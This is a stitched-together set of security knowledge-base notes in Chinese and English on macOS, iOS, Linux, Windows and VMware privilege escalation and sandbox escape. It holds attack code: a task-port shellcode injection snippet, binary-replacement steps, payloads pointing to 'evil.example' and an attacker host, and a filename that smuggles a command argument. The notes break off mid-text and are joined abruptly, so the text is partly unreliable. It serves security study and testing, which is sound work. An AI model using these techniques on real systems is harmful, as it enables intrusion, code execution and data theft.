</menuItem> <menuItem id="T1"><connections><binding keyPath="_corePerformAction" destination="C1"/></connections></menuItem> <menuItem id="T2"><connections><binding keyPath="_corePerformAction" destination="C2"/></connections></menuItem></objects> # 2. Dirty NIB injection process (attacker view) 12set theDialogText to "PWND"display dialog theDialogText # 3. Enumerating targets and nibs (useful for research / legacy systems) 123find /Applications -maxdepth 2 -name Info.plist -exec sh -c \ 'for p; do if /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" >/dev/null 2>&1; \ then echo "[+] $(dirname "$p") uses NSMainNibFile=$( /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" )"; fi; done' sh {} + # 4. Enumerating targets and nibs (useful for research / legacy systems) 1find target.app -type f \( -name "*.nib" -o -name "*.xib" \) -print # 5. Enumerating targets and nibs (useful for research / legacy systems) 1codesign --verify --deep --strict --verbose=4 target.app # 6. 检测 and DFIR tips 1log stream --info --predicate 'processImagePath CONTAINS[cd] ".app/Contents/MacOS/" AND (eventMessage CONTAINS[cd] "AppleScript" OR eventMessage CONTAINS[cd] "loadAppleScriptObjectiveCScripts")' # 检查清单 是否枚举内核、用户、组、sudo/SUID/Capabilities 是否检查可写路径和服务配置 是否验证命令上下文与副作用 是否记录提权前后差异 # 关联 主机提权与逃逸总览 知识地图 侦察枚举流水线 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/主机提权与逃逸/macOS Code Signing Weaknesses & Sandbox Escapes 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # macOS Code Signing Weaknesses & Sandbox Escapes 技术笔记 [!summary] 提炼定位 面向 主机提权与逃逸 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 拿到低权限 shell、受限命令执行或本地文件访问后，围绕 macOS Code Signing Weaknesses & Sandbox Escapes 技术笔记 找提升 / 逃逸路径。 优先枚举权限、文件能力、SUID/sudo、服务配置和可写路径。 # 中文提炼 核心目标是判断 macOS Code Signing Weaknesses & Sandbox Escapes 技术笔记 是否能把当前本地能力转换为文件读写、命令执行、提权或逃逸。 优先关注：macOS Code Signing Weaknesses & Sandbox Escapes、Ad-Hoc Signed Binaries、Basic Information、Why This Matters、Discovery；先确认用户、组、sudo/SUID/Capabilities、可写路径和服务上下文。 命令片段必须带权限上下文使用：普通用户、sudo、SUID、受限 shell、计划任务或服务账户的结果不同。 检测视角重点记录父子进程、命令行、写入路径、网络连接、权限位变化和清理步骤。 本页已沉淀 11 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 macOS Code Signing Weaknesses & Sandbox Escapes Ad-Hoc Signed Binaries Basic Information Why This Matters Discovery Attack: Binary Replacement Debuggable Processes (get-task-allow) Attack: Task Port Injection No Library Validation + DYLD Environment The Deadly Combination Attack: DYLD INSERT LIBRARIES Injection Sandbox Temporary Exceptions How They Weaken the Sandbox Mach-Lookup Exceptions = Sandbox Escape Primitive Attack: Sandbox Escape via Mach-Lookup Private Apple Entitlements What They Are Dangerous Private Entitlements # 核心要点 Ad-hoc signing (CS ADHOC) creates a code signature with no certificate chain — it's a 哈希 of the code with no developer identity verification. The binary's origin cannot be traced to any developer or organization. No verifiable identity — the binary can be replaced without 检测 by identity-based checks Third-party ad-hoc binaries in privileged positions (FDA, daemon, helpers) are high-priority targets The com.apple.security.get-task-allow entitlement (or CS GET TASK ALLOW flag) allows any process to attach as a debugger, reading memory, modifying registers, injecting code, and controlling execution. A production binary with get-task-allow is an instant 利用 primitive. Any local process can call task for pid(), get the target's Mach task port, and inject arbitrary code that runs with the target's entitlements, TCC grants, and security context. This is a guaranteed 代码注入 primitive — DYLD INSERT LIBRARIES works perfectly. # 命令 / 载荷 / 操作片段 # 1. Discovery 123456789# Find ad-hoc signed binariesfind /usr/local /opt /Applications -type f -perm +111 -exec sh -c ' flags=$(codesign -dvv "{}" 2>&1 | grep "CodeDirectory flags") echo "$flags" | grep -q "adhoc" && echo "AD-HOC: {}"' \; 2>/dev/null# Check a specific binarycodesign -dv --verbose=4 /path/to/binary 2>&1 | grep -E "Signature|flags|Authority"# Ad-hoc shows: "Signature=adhoc" and no Authority lines # 2. Attack: Binary Replacement 12345678910111213141516# If an ad-hoc signed daemon binary is in a writable location:# 1. Check the binary's current capabilitiescodesign -d --entitlements - /path/to/target 2>&1# 2. Note its TCC grants in the databasesqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \ "SELECT service, auth_value FROM access WHERE client LIKE '%target%';"# 3. Replace the binary (if location is writable)cp /tmp/malicious-binary /path/to/target# 4. Re-sign with ad-hoc signature (mimics the original)codesign -s - /path/to/target# 5. On next launch, the daemon runs your code with the original's TCC grants# (This works when TCC keyed the grant by path rather than code signature) # 3. Discovery 123456789101112# Find debuggable binariesfind /Applications /usr/local -type f -perm +111 -exec sh -c ' codesign -d --entitlements - "{}" 2>&1 | grep -q "get-task-allow.*true" && echo "DEBUGGABLE: {}"' \; 2>/dev/null# Using the scannersqlite3 /tmp/executables.db "SELECT path, privileged FROM executables eJOIN executable_capabilities ec ON e.id = ec.executable_idJOIN capabilities c ON ec.capability_id = c.idWHERE c.name = 'get_task_allow_signature'ORDER BY e.privileged DESC;" # 4. Attack: Task Port Injection 12345678910111213141516171819202122#include <mach/mach.h>#include <mach/mach_vm.h>// Get the target's task port (requires get-task-allow on target)mach_port_t task;kern_return_t kr = task_for_pid(mach_task_self(), target_pid, &task);if (kr == KERN_SUCCESS) { // Allocate memory in target process mach_vm_address_t addr = 0; mach_vm_allocate(task, &addr, shellcode_size, VM_FLAGS_ANYWHERE); // Write shellcode into target mach_vm_write(task, addr, (vm_offset_t)shellcode, shellcode_size); // Make it executable mach_vm_protect(task, addr, shellcode_size, FALSE, VM_PROT_READ | VM_PROT_EXECUTE); // Create a remote thread to execute the shellcode // The shellcode runs with ALL of the target's entitlements and TCC grants} # 5. Discovery 12345678910111213

Writes to root-owned files fail. Needs only AFC-level access (USB file copy) or any foothold that lets you replace the target SQLite DBs and 上传 载荷. Local filesystem access to /var/mobile/Media/Downloads/ and /var/mobile/Media/Books/ (via AFC clients like 3uTools, i4.cn, or afcclient over USB, or any prior compromise). HTTP server hosting attacker files (BLDatabaseManager.sqlite, iTunesMetadata.plist, crafted EPUB) exposed through URLs such as https://ATTACKER HOST/fileprovider.php?type=.... It's crucial to change the default passwords (alpine) for users root and mobile to secure the device. On-device shell applications, like NewTerm 2, facilitate direct device interaction, especially useful for troubleshooting. Reverse SSH shells can also be established for remote access from the host computer. To reset a forgotten 密码 back to the default (alpine), editing the /private/etc/master.passwd file is necessary. This involves replacing the existing 哈希 with the 哈希 for alpine next to the root and mobile user entries. Interactive Shell with Objection: Launching objection provides access to the Bundle directory of an app. From here, you can navigate to the app's Documents directory and manage files, including downloading and uploading them to and from the iOS device. Over-The-Air (OTA) Distribution Link: Apps distributed for testing via OTA can be downloaded using the ITMS services asset downloader tool, which is installed via npm and used to save the IPA file locally. # 命令 / 载荷 / 操作片段 # 1. Identifying the UDID of an iOS Device 1$ ioreg -p IOUSB -l | grep "USB Serial" # 2. Identifying the UDID of an iOS Device 12$ brew install ideviceinstaller$ idevice_id -l # 3. Identifying the UDID of an iOS Device 1$ system_profiler SPUSBDataType | sed -n -e '/iPad/,/Serial/p;/iPhone/,/Serial/p;/iPod/,/Serial/p' | grep "Serial Number:" # 4. Identifying the UDID of an iOS Device 1$ instruments -s devices # 5. Accessing the Device Shell 12$ iproxy 2222 22$ ssh -p 2222 root@localhost # 6. Transferring App Data Files 123tar czvf /tmp/data.tgz /private/var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693exitscp -P 2222 root@localhost:/tmp/data.tgz . # 7. Using Objection for File Management 123objection --gadget com.apple.mobilesafari explorercd /var/mobile/Containers/Data/Application/72C7AAFB-1D75-4FBA-9D83-D8B4A2D44133/Documentsfile download <filename> # 8. Acquiring the IPA File 12npm install -g itms-servicesitms-services -u "itms-services://?action=download-manifest&url=https://s3-ap-southeast-1.amazonaws.com/test-uat/manifest.plist" -o - > out.ipa # 9. Decryption Process 123otool -Vh Original_Apppython change_macho_flags.py --no-pie Original_Appotool -Vh Hello_World # 10. Decryption Process 12otool -l Original_App | grep -A 4 LC_ENCRYPTION_INFOdump memory dump.bin 0x8000 0x10a4000 # 11. Decryption Process 1dd bs=1 seek=<starting_address> conv=notrunc if=dump.bin of=Original_App # 12. frida-ios-dump 1$ python dump.py -l # 13. frida-ios-dump 1$ python3 dump.py -u "root" -p "<PASSWORD>" ph.telegra.Telegraph # 14. frida-ipa-extract 123python3 -m venv .venvsource .venv/bin/activatepip install -r requirements.txt # 15. frida-ipa-extract 123python extract.py -U -f com.example.app -o MyApp.ipapython extract.py -U -f com.example.app -o MyApp.ipa --sandbox --no-resumepython extract.py -H 192.168.100.32 -P 2222 -u root -p password -f com.example.app # 16. flexdecrypt 1234apt install zip unzipwget https://gist.githubusercontent.com/defparam/71d67ee738341559c35c684d659d40ac/raw/30c7612262f1faf7871ba8e32fbe29c0f3ef9e27/flexdump -P /usr/local/bin; chmod +x /usr/local/bin/flexdumpflexdump listflexdump dump Twitter.app # 17. bagbak 1bagbak --raw Chrome # 工具与参考入口 here frida-ios-dump ios-deploy flexdecrypt flexdump bagbak GitHub page yalujailbreak.net https://mas.owasp.org/MASTG/iOS/0x06b-iOS-Security-Testing/ https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0052/ https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0053/ https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-005

content: 来源路径： 02-知识点/主机提权与逃逸/euid, ruid, suid 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # euid, ruid, suid 技术笔记 [!summary] 提炼定位 面向 主机提权与逃逸 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 拿到低权限 shell、受限命令执行或本地文件访问后，围绕 euid, ruid, suid 技术笔记 找提升 / 逃逸路径。 优先枚举权限、文件能力、SUID/sudo、服务配置和可写路径。 # 中文提炼 核心目标是判断 euid, ruid, suid 技术笔记 是否能把当前本地能力转换为文件读写、命令执行、提权或逃逸。 优先关注：euid, ruid, suid、User Identification Variables、Important Note、Understanding set*uid Functions、Program Execution Mechanisms in Linux；先确认用户、组、sudo/SUID/Capabilities、可写路径和服务上下文。 命令片段必须带权限上下文使用：普通用户、sudo、SUID、受限 shell、计划任务或服务账户的结果不同。 检测视角重点记录父子进程、命令行、写入路径、网络连接、权限位变化和清理步骤。 本页已沉淀 12 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 euid, ruid, suid User Identification Variables Important Note Understanding set*uid Functions Program Execution Mechanisms in Linux execve System Call system Function Behavior of bash and sh with SUID Testing User ID Behaviors in Executions Case 1: Using setuid with system Case 2: Using setreuid with system Case 3: Using setuid with execve # 核心要点 suid: This saved user ID is pivotal when a high-privilege process (typically running as root) needs to temporarily relinquish its privileges to perform certain tasks, only to later reclaim its initial elevated status. Notably, while setuid might be a common go-to for privilege elevation to root (since it aligns all IDs to root), differentiating between these functions is crucial for understanding and manipulating user ID behaviors in varying scenarios. Functionality: Unlike execve, system creates a child process using fork and executes a command within that child process using execl. Command Execution: Executes the command via sh with execl("/bin/sh", "sh", "-c", command, (char *) NULL);. system executes /bin/bash -c id due to the symlink from sh to bash. # 命令 / 载荷 / 操作片段 # 1. Case 1: Using setuid with system 123456789#define _GNU_SOURCE#include <stdlib.h>#include <unistd.h>int main(void) { setuid(1000); system("id"); return 0;} # 2. Case 1: Using setuid with system 12oxdf@hacky$ gcc a.c -o /mnt/nfsshare/a;oxdf@hacky$ chmod 4755 /mnt/nfsshare/a # 3. Case 1: Using setuid with system 12bash-4.2$ $ ./auid=99(nobody) gid=99(nobody) groups=99(nobody) context=system_u:system_r:unconfined_service_t:s0 # 4. Case 2: Using setreuid with system 123456789#define _GNU_SOURCE#include <stdlib.h>#include <unistd.h>int main(void) { setreuid(1000, 1000); system("id"); return 0;} # 5. Case 2: Using setreuid with system 1oxdf@hacky$ gcc b.c -o /mnt/nfsshare/b; chmod 4755 /mnt/nfsshare/b # 6. Case 2: Using setreuid with system 12bash-4.2$ $ ./buid=1000(frank) gid=99(nobody) groups=99(nobody) context=system_u:system_r:unconfined_service_t:s0 # 7. Case 3: Using setuid with execve 123456789#define _GNU_SOURCE#include <stdlib.h>#include <unistd.h>int main(void) { setuid(1000); execve("/usr/bin/id", NULL, NULL); return 0;} # 8. Case 3: Using setuid with execve 12bash-4.2$ $ ./cuid=99(nobody) gid=99(nobody) euid=1000(frank) groups=99(nobody) context=system_u:system_r:unconfined_service_t:s0 # 9. Case 3: Using setuid with execve 123456789#define _GNU_SOURCE#include <stdlib.h>#include <unistd.h>int main(void) { setuid(1000); execve("/bin/bash", NULL, NULL); return 0;} # 10. Case 3: Using setuid with execve 123bash-4.2$ $ ./dbash-4.2$ $ iduid=99(nobody) gid=99(nobody) groups=99(nobody) context=system_u:system_r:unconfined_service_t:s0 # 11. Case 3: Using setuid with execve 12345678910#define _GNU_SOURCE#include <stdlib.h>#include <unistd.h>int main(void) { char *const paramList[10] = {"/bin/bash", "-p", NULL}; setuid(1000); execve(paramList[0], paramList, NULL); return 0;} # 12. Case 3: Using setuid with execve 123bash-4.2$ $ ./ebash-4.2$ $ iduid=99(nobody) gid=99(nobody) euid=100 # 工具与参考入口 setuid man page setresuid man page setreuid man page execve man page system man page bash man page sh man page https://0xdf.gitlab.io/2022/05/31/setuid-rabbithole.html#testing-on-jail # 检查清单 是否枚举内核、用户、组、sudo/SUID/Capabilities 是否检查可写路径和服务配置 是否验证命令上下文与副作用 是否记录提权前后差异 # 关联 主机提权与逃逸总览 知识地图 Linux 原生工具利用 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

The immediate abuse value is mostly 侦察. If the host cgroup namespace is shared, compare the visible paths and look for host-revealing hierarchy details: The cgroup namespace alone is usually not enough for escape. The practical escalation happens when host-revealing cgroup paths are combined with writable cgroup v1 interfaces: If those files are reachable and writable, pivot immediately into the full release agent 利用 flow from cgroups.md. The impact is host code execution from inside the 容器. Without writable cgroup interfaces, the impact is usually limited to 侦察. Host-revealing paths in /proc/self/cgroup are useful 侦察 even when they are not directly exploitable. # 命令 / 载荷 / 操作片段 # 1. Lab 123sudo unshare --cgroup --fork bashcat /proc/self/cgroupls -l /proc/self/ns/cgroup # 2. Lab 12docker run --rm debian:stable-slim cat /proc/self/cgroupdocker run --rm --cgroupns=host debian:stable-slim cat /proc/self/cgroup # 3. Abuse 123readlink /proc/self/ns/cgroupcat /proc/self/cgroupcat /proc/1/cgroup 2>/dev/null # 4. Abuse 12find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null -exec ls -l {} \;find /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50 # 5. Full Example: Shared cgroup Namespace + Writable cgroup v1 123cat /proc/self/cgroupfind /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/nullfind /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null | head # 6. Checks 123readlink /proc/self/ns/cgroup # Namespace identifier for cgroup viewcat /proc/self/cgroup # Visible cgroup paths from inside the workloadmount | grep cgroup # Mounted cgroup filesystems and their type # 检查清单 是否枚举内核、用户、组、sudo/SUID/Capabilities 是否检查可写路径和服务配置 是否验证命令上下文与副作用 是否记录提权前后差异 # 关联 主机提权与逃逸总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/主机提权与逃逸/Zero-click Messaging → Image Parser Chains 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Zero-click Messaging → Image Parser Chains 技术笔记 [!summary] 提炼定位 面向 主机提权与逃逸 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 拿到低权限 shell、受限命令执行或本地文件访问后，围绕 Zero-click Messaging → Image Parser Chains 技术笔记 找提升 / 逃逸路径。 优先枚举权限、文件能力、SUID/sudo、服务配置和可写路径。 # 中文提炼 核心目标是判断 Zero-click Messaging → Image Parser Chains 技术笔记 是否能把当前本地能力转换为文件读写、命令执行、提权或逃逸。 优先关注：Zero-click Messaging → Image Parser Chains、TL;DR、Remote content loading via WhatsApp linked-device commands、Attack surface recap、Practical workflow for auditors；先确认用户、组、sudo/SUID/Capabilities、可写路径和服务上下文。 命令片段必须带权限上下文使用：普通用户、sudo、SUID、受限 shell、计划任务或服务账户的结果不同。 检测视角重点记录父子进程、命令行、写入路径、网络连接、权限位变化和清理步骤。 本页已沉淀 4 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Zero-click Messaging → Image Parser Chains TL;DR Remote content loading via WhatsApp linked-device commands Attack surface recap Practical workflow for auditors Don't stop at linked-device sync Weaponizing auto-decoded DNGs against RawCamera Triggering RawCamera from WhatsApp Crafting memory-corrupting DNGs (CVE-2025-43300 style) Building the 0-click chain Recent Apple parser-chain patterns worth reusing Samsung vendor image parser parallels Testing & hardening checklist # 核心要点 The DNG-based RawCamera and Samsung parser bugs discussed here are concrete examples, but the full technique is a reusable blueprint for chaining logic flaws → image parser memory corruption → full device compromise. Reach the iOS client, where the vulnerable code path automatically triggered a background HTTP(S) request to the attacker URL and parsed the response in a hidden WebView/media renderer. Capture legitimate linked-device traffic. Attach a debugger or Frida script to the desktop/iOS client and hook the post-decryption handler (e.g., LinkedDevicesSyncHandler::processAction). Dump decoded protobuf 载荷 to learn available action types and parameters. Identify fields that cross trust boundaries. Any action carrying http url, thumbnail uri, 下载 url, or render html parameters without strict allow-lists is a candidate remote-content primitive. Forge a malicious action. Reuse the observed protobuf schema and modify only the attacker-controlled fields. A simplified JSON view of the relevant logical structure is shown below (the actual transport is protobuf/Noise, but the semantic fields match): The iOS media sandbox will stream the file into RawCamera via CGImageSourceCreateWithURL, eventually hitting the vulnerable decoder. Sub-IFD chains: Embed secondary images with conflicting ImageWidth/ImageLength and BitsPerSample so RawCamera computes a small buffer while later stages trust attacker-controlled dimensions. Opcode metadata: Manipulate OpcodeList3 entries so that per-row processing operates on attacker-chosen indexes. Identify an auto-preview vector (chat thumbnails, notification previews, share sheets, gallery rescans) that parses the attacker file with Samsung’s vendor image stack. Deliver the crafted file through any channel that already auto-loads content (e.g., the same linked-device primitive, WhatsApp preview fetchers, or Android’s push-to-talk waveform previews). Protocol validation: Enforce strict allow-lists for every linked-device action. Companion commands that request a fetch/render must prove device pairing (signing the 载荷) and the URL should match an allow-list or signed blob. Crash triage automation: Attach DYLD INSERT LIBRARIES sanitizers or MTE on fuzz devices to catch subtle OOB conditions before attackers do. # 命令 / 载荷 / 操作片段 # 1. Practical workflow for auditors 12345678910{ "op": "sync_action", "device_id": "<attacker-companion>", "payload": { "target": "content_sync", "resource_url": "https://evil.example/payload.html", "media_type": "image/dng", "flags": ["background_fetch", "render_inline"] }} # 2. Don't stop at linked-device sync 1rg -n "rich_response|hero_image|preview_url|media_url|thumbnail_uri" protobufs/ decompiled/ # 3. Crafting memory-corrupting DNGs (CVE-2025-43300 style) 12345678exiftool -s -SamplesPerPixel -BitsPerSample -Compression poc.dngpython3 - <<'PY'from pathlib import Pathdata = Path('poc.dng').read_bytes()sof3 = data.index(b'\xff\xc3')print('SOF3 NumComponents =', data[sof3 + 9])print('DHT markers =', data.count(b'\xff\xc4'))PY # 4. Crafting memory-corrupting DNGs (CVE-2025-43300 style) 12345678#!/bin/bashset -efor sample in corpus/*.dng; do radamsa "$sample" > /tmp/poc.dng /System/Library/CoreServices/RawCamera.bundle/Contents/MacOS/RawCamera /tmp/poc.dng >/tmp/out 2>&1 || { mv /tmp/poc.dng crashes/$(date +%s).dng }done # 工具与参考入口 Project Zero: Blasting Past WebP Quarkslab: 逆向工程 of Apple's iOS 0-click CVE-2025-43300 W

It comes in three versions: 1, 2, and 3, with version 1 being the most commonly utilized. The transformation process can be executed either on the server or within the browser. Once you have the vendor string, switch quickly to the processor-specific primitives instead of retrying generic XXE 载荷: Xalan / Apache: test Java extension namespaces such as http://xml.apache.org/xalan/java and xalan://...; blind RCE or file-write 载荷 are often easier than capturing stdout. Microsoft / .NET: test document () plus msxsl:script; on modern .NET (Core / 5+) embedded script is unsupported, so a failed script 载荷 does not rule out document()-based SSRF/LFI. 上传 this and take information On libxslt, document() is useful for SSRF and for reading other XML documents, but trying to read arbitrary local text files such as /etc/passwd will often fail because the referenced resource is parsed as XML. First write a marker into a web-served path to confirm the primitive. Then write into an execution sink already present on the host, such as a cron-polled script directory, a parser auto-reload path, or another scheduled task input. In this page you can find examples of RCE in other languajes: https://vulncat.fortify.com/en/detail?id=desc.dataflow.java.xslt injection#C%23%2FVB.NET%2FASP.NET (C#, Java, PHP) Check https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSLT Injection Check https://vulncat.fortify.com/en/detail?id=desc.dataflow.java.xslt injection PayloadsAllTheThings：XSLT Injection # 命令 / 载荷 / 操作片段 # 1. content: 来源路径： 02-知识点/主机提权与逃逸/Writable Sys Path +Dll Hijacking Privesc 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Writable Sys Path +Dll Hijacking Privesc 技术笔记 [!summary] 提炼定位 面向 主机提权与逃逸 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 拿到低权限 shell、受限命令执行或本地文件访问后，围绕 Writable Sys Path +Dll Hijacking Privesc 技术笔记 找提升 / 逃逸路径。 优先枚举权限、文件能力、SUID/sudo、服务配置和可写路径。 # 中文提炼 核心目标是判断 Writable Sys Path +Dll Hijacking Privesc 技术笔记 是否能把当前本地能力转换为文件读写、命令执行、提权或逃逸。 优先关注：Writable Sys Path +Dll Hijacking Privesc、Introduction、Privesc with Dll Hijacking、Finding a missing Dll、Missed Dlls；先确认用户、组、sudo/SUID/Capabilities、可写路径和服务上下文。 命令片段必须带权限上下文使用：普通用户、sudo、SUID、受限 shell、计划任务或服务账户的结果不同。 检测视角重点记录父子进程、命令行、写入路径、网络连接、权限位变化和清理步骤。 本页已沉淀 2 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Writable Sys Path +Dll Hijacking Privesc Introduction Privesc with Dll Hijacking Finding a missing Dll Missed Dlls Other candidates worth triaging 利用 # 核心要点 If you found that you can write in a System Path folder (note that this won't work if you can write in a User Path folder) it's possible that you could escalate privileges in the system. The first thing you need is to identify a process running with more privileges than you that is trying to load a Dll from the System Path you can write in. Remember that this technique depends on a Machine/System PATH entry, not only on your User PATH. Therefore, before spending time on Procmon, it's worth enumerating the Machine PATH entries and checking which ones are writable: The problem in this cases is that probably thoses processes are already running. To find which Dlls are lacking the services you need to launch procmon as soon as possible (before processes are loaded). So, to find lacking .dlls do: Once Windows is started execute procmon again, it'll tell you that it has been running and will ask you if you want to store the events in a file. Say yes and store the events in a file. WptsExtensions.dll is a good example, but it is not the only recurring phantom DLL that shows up in privileged services. Modern hunting rules and public hijack catalogs still track names such as: # 命令 / 载荷 / 操作片段 # 1. Finding a missing Dll 12345678$machinePath = [Environment]::GetEnvironmentVariable("Path", "Machine") -split ';' | Where-Object { $_ }$machinePath | ForEach-Object { $path = $_.Trim() if ($path) { Write-Host "`n[*] $path" icacls $path 2>$null }} # 2. Finding a missing Dll 1234567891011121314# Set the folder path to create and check events for$folderPath = "C:\privesc_hijacking"# Create the folder if it does not existif (!(Test-Path $folderPath -PathType Container)) { New-Item -ItemType Directory -Path $folderPath | Out-Null}# Set the folder path in the System environment variable PATH$envPath = [Environment]::GetEnvironmentVariable("PATH", "Machine")if ($envPath -notlike "*$folderPath*") { $newPath = "$envPath;$folderPath" [Environment]::SetEnvironmentVariable("PATH", $newPath, "Machine")} # 工具与参考入口 abuse WptsExtensions.dll for privesc Windows DLL Hijacking (Hopefully) Clarified Suspicious DLL Loaded for 持久化 or 权限提升 # 检查清单 是否枚举内核、用户、组、sudo/SUID/Capabilities 是否检查可写路径和服务配置 是否验证命令上下文与副作用 是否记录提权前后差异 # 关联 主机提权与逃逸总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

Since the shell expands the wildcard before executing the binary, an attacker who can create files in the working directory can craft filenames that begin with：so they are interpreted as options instead of data, effectively smuggling arbitrary flags or even commands. This page collects the most useful primitives, recent research and modern detections for 2023-2025. When root later executes something like: PoC & tool: wildpwn (combined attack). Execute arbitrary commands by abusing the checkpoint feature: Do NOT try a single filename like '-T -TT <cmd>' — short options are parsed per character and it will fail. Use separate tokens as shown. If slashes are stripped from filenames by the app, fetch from a bare host/IP (default path /index.html) and save locally with -O, then execute. You can debug parsing with -sc (show processed argv) or -h2 (more help) to understand how your tokens are consumed. Data exfil/leak: If the web layer echoes zip stdout/stderr (common with naive wrappers), injected flags like --help or failures from bad options will surface in the HTTP response, confirming command-line injection and aiding 载荷 tuning. web features that "下载 everything as zip/tar" from attacker-controlled 上传 directories vendor/appliance debug shells that expose a tcpdump wrapper with attacker-controlled filename/filter fields For zip, look for wrappers that enumerate user-controlled filenames directly; short-option splitting (-T + -TT <cmd>) still works even without a shell glob. The wrapper does not sanitize spaces or --prefixed tokens in the file name field. # 命令 / 载荷 / 操作片段 # 1. chown / chmod 12# attacker-controlled directorytouch "--reference=/root/secret``file" # ← filename becomes an argument # 2. chown / chmod 12chown -R alice:alice *.phpchmod -R 644 *.php # 3. content: 来源路径： 02-知识点/主机提权与逃逸/VMware Workstation PVSCSI LFH Escape (VMware-vmx on Windows 11) 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # VMware Workstation PVSCSI LFH Escape (VMware-vmx on Windows 11) 技术笔记 [!summary] 提炼定位 面向 主机提权与逃逸 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 拿到低权限 shell、受限命令执行或本地文件访问后，围绕 VMware Workstation PVSCSI LFH Escape (VMware-vmx on Windows 11) 技术笔记 找提升 / 逃逸路径。 优先枚举权限、文件能力、SUID/sudo、服务配置和可写路径。 # 中文提炼 核心目标是判断 VMware Workstation PVSCSI LFH Escape (VMware-vmx on Windows 11) 技术笔记 是否能把当前本地能力转换为文件读写、命令执行、提权或逃逸。 优先关注：VMware Workstation PVSCSI LFH Escape (VMware-vmx on Windows 11)、Bug anatomy: fixed-size realloc + scattered OOB writes、Guest-controlled host objects used by the chain、LFH constraints & deterministic "Ping-Pong" placement、Reap Oracle: labeling contiguous holes；先确认用户、组、sudo/SUID/Capabilities、可写路径和服务上下文。 命令片段必须带权限上下文使用：普通用户、sudo、SUID、受限 shell、计划任务或服务账户的结果不同。 检测视角重点记录父子进程、命令行、写入路径、网络连接、权限位变化和清理步骤。 本页已沉淀 1 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 VMware Workstation PVSCSI LFH Escape (VMware-vmx on Windows 11) Bug anatomy: fixed-size realloc + scattered OOB writes Guest-controlled host objects used by the chain LFH constraints & deterministic "Ping-Pong" placement Reap Oracle: labeling contiguous holes Turning constrained writes into arbitrary overwrite (coalescing abuse) Hybrid URB infoleak via coalescing side-effects Post-leak primitives (no re-triggering the bug) LFH timing side-channel to learn the initial bucket offset # 核心要点 The public 利用 assumes a Linux guest: the vmw pvscsi driver exposes attacker-controlled PVSCSISGElement arrays, while the default UHCI controller gives a FIFO URB queue plus the reap primitive. PVSCSI is only the corruption source: guest S/G entries trigger the 0x4000 realloc loop and the scattered 16-byte OOB writes. UHCI URBs are the durable victims/oracles: they remain alive until fully reaped and expose actual len, data ptr, pipe, and list links that turn a partial overwrite into leak / read / write / call primitives. Iteration 1025 corrupts the header after PONG (never touched again); iteration 1026 hits the first 16 bytes of the URB after PING (safe metadata 绕过). Reclaim PING/PONG with placeholder shaders to keep the layout stable and repeatable. UHCI URBs live in a FIFO queue and are freed when fully reaped. The constrained 16-byte overwrite always zeroes actual len, giving a marker. Vacuum + 载荷: Set entries [1023..2047] to {addr=0,len=0} so coalescing collapses them into one, creating a logical hole. 载荷 entries placed afterwards (in the shader) are moved up into earlier memory, landing inside the victim URB. Adjacency-check 绕过: By setting LenA=0, the condition becomes AddrA==AddrB. Craft pairs Compaction copies the following data upward, pulling URB2’s header into URB1. URB1 now has a valid header (pipe/list pointers), actual len=0x400, and a data pointer already at the end of URB2’s buffer. Reaping URB1 copies 0x400 bytes starting just before URB3, yielding an OOB read of URB3’s header/self-references, which reveals absolute heap addresses and defeats ASLR for subsequent forged structures. Arbitrary read: fake URB with chosen data ptr and actual len, then reap to copy host memory to the guest. Arbitrary write (32-bit): fake URB whose pipe points to controlled memory and abuse the UHCI TDBuffer writeback to store a chosen dword at an arbitrary address. # 命令 / 载荷 / 操作片段 # 1. Turning constrained writes into arbitrary overwrite (coalescing abuse) 12{addr = X, len = 0} {addr = X, len = Y} # 工具与参考入口 Synacktiv – On the clock: Escaping VMware Workstation at Pwn2Own Berlin 2025 # 检查清单 是否枚举内核、用户、组、sudo/SUID/Capabilities 是否检查可写路径和服务配置 是否验证命令上下文与副作用 是否记录提权前后差异 # 关联 主机提权与逃逸总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

